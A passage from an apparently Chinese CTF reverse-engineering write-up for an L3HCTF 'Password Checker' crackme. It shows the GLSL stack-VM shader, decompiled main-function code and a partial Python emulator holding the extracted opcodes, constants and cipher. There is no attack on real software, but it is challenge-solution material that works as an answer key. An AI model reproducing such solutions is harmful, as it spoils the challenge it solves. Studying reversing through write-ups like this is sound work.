class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-comment">#version 430 core</span><br><br>layout(local_size_x = <span class="hljs-number">1</span>, local_size_y = <span class="hljs-number">1</span>, local_size_z = <span class="hljs-number">1</span>) <span class="hljs-keyword">in</span>;<br>layout(std430, binding = <span class="hljs-number">0</span>) buffer OpCodes  &#123; <span class="hljs-built_in">int</span> opcodes[]; &#125;;<br>layout(std430, binding = <span class="hljs-number">2</span>) buffer CoConsts &#123; <span class="hljs-built_in">int</span> co_consts[]; &#125;;<br>layout(std430, binding = <span class="hljs-number">3</span>) buffer Cipher   &#123; <span class="hljs-built_in">int</span> cipher[<span class="hljs-number">16</span>]; &#125;;<br>layout(std430, binding = <span class="hljs-number">4</span>) buffer Stack    &#123; <span class="hljs-built_in">int</span> stack_data[<span class="hljs-number">256</span>]; &#125;;<br>layout(std430, binding = <span class="hljs-number">5</span>) buffer Out      &#123; <span class="hljs-built_in">int</span> verdict;         &#125;;<br><br>const <span class="hljs-built_in">int</span> MaxInstructionCount = <span class="hljs-number">1000</span>;<br><br>void main()<br>&#123;<br>    <span class="hljs-keyword">if</span> (gl_GlobalInvocationID.x &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<br><br>    uint ip = 0u;<br>    <span class="hljs-built_in">int</span> sp = <span class="hljs-number">0</span>;<br>    verdict = -<span class="hljs-number">233</span>;<br><br>    <span class="hljs-keyword">while</span> (ip &lt; uint(MaxInstructionCount))<br>    &#123;<br>        <span class="hljs-built_in">int</span> opcode = opcodes[<span class="hljs-built_in">int</span>(ip)];<br>        <span class="hljs-built_in">int</span> arg    = opcodes[<span class="hljs-built_in">int</span>(ip)+<span class="hljs-number">1</span>];<br><br>        switch (opcode)<br>        &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                stack_data[sp++] = co_consts[arg];<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> b = stack_data[--sp];<br>                <span class="hljs-built_in">int</span> a = stack_data[--sp];<br>                stack_data[sp++] = a + b;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> a = stack_data[--sp];<br>                <span class="hljs-built_in">int</span> b = stack_data[--sp];<br>                stack_data[sp++] = a - b;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> b = stack_data[--sp];<br>                <span class="hljs-built_in">int</span> a = stack_data[--sp];<br>                stack_data[sp++] = a ^ b;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-number">15</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> b = stack_data[--sp];<br>                <span class="hljs-built_in">int</span> a = stack_data[--sp];<br>                stack_data[sp++] = <span class="hljs-built_in">int</span>(a == b);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            &#123;<br>                <span class="hljs-built_in">bool</span> ok = true;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (stack_data[i] != (cipher[i] - <span class="hljs-number">20</span>))<br>                    &#123; <br>                        ok = false; <br>                        <span class="hljs-keyword">break</span>; <br>                    &#125;<br>                &#125;<br>                verdict = ok ? <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-number">18</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> c = stack_data[--sp];<br>                <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) ip = uint(arg);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            default:<br>                verdict = <span class="hljs-number">500</span>;<br>                <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        ip+=<span class="hljs-number">2</span>;<br>    &#125;<br>    verdict = <span class="hljs-number">501</span>;<br>&#125;<br>l <br><br>进程已结束，退出代码为 <span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><hr><p>从这三个地址里得到opcodes，co_consts和cipher的内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507182250461.png" alt="image-20250718225015357"></p><p>这里贴出主函数的内容以及注释部分</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c#">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_7FF656701CF0</span>(<span class="hljs-params"><span class="hljs-built_in">double</span> a1</span>)</span><br>&#123;<br>  <span class="hljs-built_in">int</span> v1; <span class="hljs-comment">// ebx</span><br>  __m128i v2; <span class="hljs-comment">// xmm6</span><br>  unsigned <span class="hljs-built_in">int</span> v3; <span class="hljs-comment">// eax</span><br>  unsigned <span class="hljs-built_in">int</span> v4; <span class="hljs-comment">// r13d</span><br>  unsigned <span class="hljs-built_in">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-built_in">int</span> v6; <span class="hljs-comment">// eax</span><br>  __int64 v7; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-built_in">bool</span> v8; <span class="hljs-comment">// dl</span><br>  <span class="hljs-built_in">bool</span> v9; <span class="hljs-comment">// al</span><br>  <span class="hljs-built_in">int</span> v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-built_in">char</span> *v12; <span class="hljs-comment">// r15</span><br>  unsigned <span class="hljs-built_in">int</span> v13; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-built_in">int</span> v14; <span class="hljs-comment">// eax</span><br>  unsigned <span class="hljs-built_in">int</span> v15; <span class="hljs-comment">// r9d</span><br>  <span class="hljs-built_in">int</span> v16; <span class="hljs-comment">// edx</span><br>  <span class="hljs-built_in">int</span> v17; <span class="hljs-comment">// eax</span><br>  <span class="hljs-built_in">int</span> v18; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-built_in">int</span> v19; <span class="hljs-comment">// eax</span><br>  unsigned <span class="hljs-built_in">int</span> v20; <span class="hljs-comment">// [rsp+38h] [rbp-100h]</span><br>  unsigned <span class="hljs-built_in">int</span> v21; <span class="hljs-comment">// [rsp+3Ch] [rbp-FCh]</span><br>  unsigned <span class="hljs-built_in">int</span> v22; <span class="hljs-comment">// [rsp+40h] [rbp-F8h]</span><br>  unsigned <span class="hljs-built_in">int</span> v23; <span class="hljs-comment">// [rsp+44h] [rbp-F4h]</span><br>  unsigned <span class="hljs-built_in">int</span> v24; <span class="hljs-comment">// [rsp+48h] [rbp-F0h]</span><br>  <span class="hljs-built_in">int</span> v25; <span class="hljs-comment">// [rsp+4Ch] [rbp-ECh]</span><br>  __m128i v26; <span class="hljs-comment">// [rsp+50h] [rbp-E8h] BYREF</span><br>  <span class="hljs-built_in">int</span> v27; <span class="hljs-comment">// [rsp+6Ch] [rbp-CCh] BYREF</span><br>  <span class="hljs-built_in">char</span> Str[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-C8h] BYREF</span><br>  __int64 v29; <span class="hljs-comment">// [rsp+78h] [rbp-C0h]</span><br>  __int64 v30; <span class="hljs-comment">// [rsp+80h] [rbp-B8h]</span><br>  __int64 v31; <span class="hljs-comment">// [rsp+88h] [rbp-B0h]</span><br>  __int64 v32[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+90h] [rbp-A8h] BYREF</span><br>  __int64 v33[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+C8h] [rbp-70h]</span><br><br>  v1 = <span class="hljs-number">0</span>;<br>  sub_7FF6566FE370();<br>  sub_7FF656693480(<span class="hljs-number">8256</span>);<br>  sub_7FF65668F730(<span class="hljs-number">0x500</span>u, <span class="hljs-number">0x320</span>u, <span class="hljs-string">&quot;Password Checker&quot;</span>);<span class="hljs-comment">// 创建窗口</span><br>  sub_7FF656691100(&amp;v26, <span class="hljs-number">0</span>i64, aVersion330Defi);<br>  v2 = _mm_loadu_si128(&amp;v26);<br>  v3 = sub_7FF65667E700(aVersion430Core, <span class="hljs-number">37305</span>i64);<span class="hljs-comment">// 创建计算着色器</span><br>  v20 = sub_7FF65667EEE0(v3);                   <span class="hljs-comment">// 创建着色器程序</span><br>  v21 = sub_7FF65667EFF0(<span class="hljs-number">0x2A0</span>u, &amp;unk_7FF6567030E0, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// opcodes</span><br>  v4 = sub_7FF65667EFF0(<span class="hljs-number">0x80</span>u, &amp;dword_7FF656703060, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// co_consts</span><br>  v22 = sub_7FF65667EFF0(<span class="hljs-number">0x40</span>u, &amp;unk_7FF656703020, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// cipher</span><br>  v23 = sub_7FF65667EFF0(<span class="hljs-number">0x400</span>u, &amp;unk_7FF65675F040, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// stack</span><br>  v5 = sub_7FF65667EFF0(<span class="hljs-number">4u</span>, &amp;dword_7FF656703000, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// verdict</span><br>  v33[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>i64;<br>  v24 = v5;<br>  *Str = <span class="hljs-number">0</span>i64;<br>  v29 = <span class="hljs-number">0</span>i64;<br>  v30 = <span class="hljs-number">0</span>i64;<br>  v31 = <span class="hljs-number">0</span>i64;<br>  memset(v32, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v32));<br>  *(v33 + <span class="hljs-number">5</span>) = <span class="hljs-number">0</span>i64;<br>  sub_7FF6566931A0(<span class="hljs-number">60</span>);<br>  <span class="hljs-keyword">while</span> ( !sub_7FF65668CAC0() )<br>  &#123;<br>    v6 = sub_7FF656695A40();                    <span class="hljs-comment">// 输入</span><br>    <span class="hljs-keyword">if</span> ( v6 &gt; <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">99</span> )<br>    &#123;<br>      v7 = v1 + <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        Str[v7 - <span class="hljs-number">1</span>] = v6;<br>        v1 = v7;<br>        v6 = sub_7FF656695A40();<br>        v8 = v7++ &lt;= <span class="hljs-number">99</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v8 &amp;&amp; v6 &gt; <span class="hljs-number">0</span> );<br>    &#125;<br>    v9 = sub_7FF6566958E0(<span class="hljs-number">259</span>);<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0</span> &amp;&amp; v9 )<br>      Str[--v1] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( sub_7FF6566958E0(<span class="hljs-number">257</span>) &amp;&amp; strlen(Str) == <span class="hljs-number">40</span> &amp;&amp; !strncmp(Str, <span class="hljs-string">&quot;L3HCTF&#123;&quot;</span>, <span class="hljs-number">7u</span>i64) &amp;&amp; HIBYTE(v32[<span class="hljs-number">0</span>]) == <span class="hljs-number">125</span> )<br>    &#123;                                           <span class="hljs-comment">// 提取花括号内的32个字符</span><br>      v25 = v1;<br>      v12 = &amp;Str[<span class="hljs-number">7</span>];<br>      v13 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">do</span>                                        <span class="hljs-comment">// 将十六进制字符串转换为数值</span><br>      &#123;<br>        v17 = *v12;<br>        v18 = v12[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> ( v17 &gt; <span class="hljs-number">96</span> )<br>          v14 = v17 - <span class="hljs-number">87</span>;                       <span class="hljs-comment">// 字符转数字 (0-9, a-f, A-F)</span><br>        <span class="hljs-keyword">else</span><br>          v14 = v17 - <span class="hljs-number">48</span>;<br>        v19 = <span class="hljs-number">16</span> * v14;<br>        v15 = v13;<br>        v16 = v18 - <span class="hljs-number">48</span>;<br>        <span class="hljs-keyword">if</span> ( v18 &gt;= <span class="hljs-number">97</span> )<br>          v16 = v18 - <span class="hljs-number">87</span>;<br>        v12 += <span class="hljs-number">2</span>;<br>        v13 += <span class="hljs-number">4</span>;<br>        v27 = v16 + v19;                        <span class="hljs-comment">// 组合成一个字节</span><br>                                                <span class="hljs-comment">// 32 个字符被转换为 16 个整数，每个整数由 2 个十六进制字符组成</span><br>        sub_7FF65667F0B0(v4, &amp;v27, <span class="hljs-number">4u</span>, v15);    <span class="hljs-comment">// 将转换后的字节写入co_consts缓冲区</span><br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v32 + <span class="hljs-number">7</span> != v12 );<br>      v1 = v25;<br>      sub_7FF65667C100(v20);                    <span class="hljs-comment">// 执行计算着色器</span><br>      sub_7FF65667F180(v21, <span class="hljs-number">0</span>i64);              <span class="hljs-comment">// opcodes</span><br>      sub_7FF65667F180(v4, <span class="hljs-number">2</span>i64);               <span class="hljs-comment">// co_consts </span><br>      sub_7FF65667F180(v22, <span class="hljs-number">3</span>i64);              <span class="hljs-comment">// cipher</span><br>      sub_7FF65667F180(v23, <span class="hljs-number">4</span>i64);<br>      sub_7FF65667F180(v24, <span class="hljs-number">5</span>i64);<br>      sub_7FF65667EFE0(<span class="hljs-number">1</span>i64, <span class="hljs-number">1</span>i64, <span class="hljs-number">1</span>i64);       <span class="hljs-comment">// 执行着色器</span><br>      sub_7FF65667F140(v24, &amp;dword_7FF656703000, <span class="hljs-number">4</span>i64, <span class="hljs-number">0</span>i64);<br>      sub_7FF65667C110();<br>    &#125;<br>    sub_7FF65668FC90(a1);<br>    v26 = v2;<br>    sub_7FF656690650(&amp;v26);<br>    a1 = sub_7FF65668E170();<br>    v26 = v2;<br>    *&amp;a1 = a1;<br>    v27 = LODWORD(a1);<br>    v10 = sub_7FF656691440(&amp;v26);<br>    v26 = v2;<br>    sub_7FF656691460(v26.m128i_i64, v10, &amp;v27, <span class="hljs-number">0</span>);<br>    sub_7FF6566AB9D0(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1280</span>i64, <span class="hljs-number">0x320</span>u, <span class="hljs-number">0xFFFFFFFF</span>);<br>    sub_7FF656690690();<br>    sub_7FF6566BDA20(Str, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0xC8</span>u, <span class="hljs-number">40</span>, <span class="hljs-number">-16777216</span>);<br>    <span class="hljs-keyword">if</span> ( dword_7FF656703000 == <span class="hljs-number">1</span> )<br>      sub_7FF6566BDA20(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0x12C</span>u, <span class="hljs-number">40</span>, <span class="hljs-number">-13863680</span>);<br>    <span class="hljs-keyword">else</span><br>      sub_7FF6566BDA20(<span class="hljs-string">&quot;wrong password&quot;</span>, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0x12C</span>u, <span class="hljs-number">40</span>, <span class="hljs-number">-13162010</span>);<br>    sub_7FF6566BDA20(<span class="hljs-string">&quot;Type password and press [Enter] to check!&quot;</span>, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0x64</span>u, <span class="hljs-number">20</span>, <span class="hljs-number">-8224126</span>);<br>    sub_7FF6566BDA20(<span class="hljs-string">&quot;Press [Backspace] to delete characters.&quot;</span>, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0x82</span>u, <span class="hljs-number">20</span>, <span class="hljs-number">-8224126</span>);<br>    sub_7FF656695CE0();<br>  &#125;<br>  sub_7FF65668FAA0();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到关键信息之后，写一个解释器，看看虚拟机解释器是如何操作栈中的数据，得到加密逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python">STACK_SIZE = <span class="hljs-number">256</span><br>MAX_OPCODES = <span class="hljs-number">1000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 指令流</span><br>    opcodes = [<br>        <span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">16</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">17</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">18</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">19</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">20</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">21</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">22</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">23</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">24</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">25</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">26</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">27</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">28</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">29</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">30</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<br>        <span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">16</span>,<span class="hljs-number">2</span>,<span class="hljs-number">17</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">18</span>,<span class="hljs-number">84</span>,<span class="hljs-number">2</span>,<span class="hljs-number">31</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span><br>    ]<br><br>    <span class="hljs-comment"># 常量池（输入）</span><br>    co_consts = [<br>        <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBF</span>,<br>        <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x00</span><br>    ]<br><br>    <span class="hljs-comment"># cipher（目标值）</span><br>    cipher = [<br>        <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x1FD</span>, <span class="hljs-number">0x150</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xDE</span>,<br>        <span class="hljs-number">0x15A</span>, <span class="hljs-number">0x197</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1D7</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x146</span>, <span class="hljs-number">0x97</span><br>    ]<br><br>    <span class="hljs-comment"># 初始化栈</span><br>    stack_data = [<span class="hljs-number">0</span>] * STACK_SIZE<br>    sp = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 执行指令</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(opcodes):<br>        opcode = opcodes[i]<br>        arg = opcodes[i + <span class="hljs-number">1</span>]<br><br>        sp0 = sp  <span class="hljs-comment"># 保存执行前的栈指针位置</span><br><br>        <span class="hljs-keyword">if</span> opcode == <span class="hljs-number">2</span>:<br>            <span class="hljs-comment"># PUSH co_consts[arg]</span><br>            v = co_consts[arg] <span class="hljs-keyword">if</span> arg &lt; <span class="hljs-built_in">len</span>(co_consts) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>            stack_data[sp] = v<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = co_consts[<span class="hljs-subst">&#123;arg&#125;</span>] = 0x<span 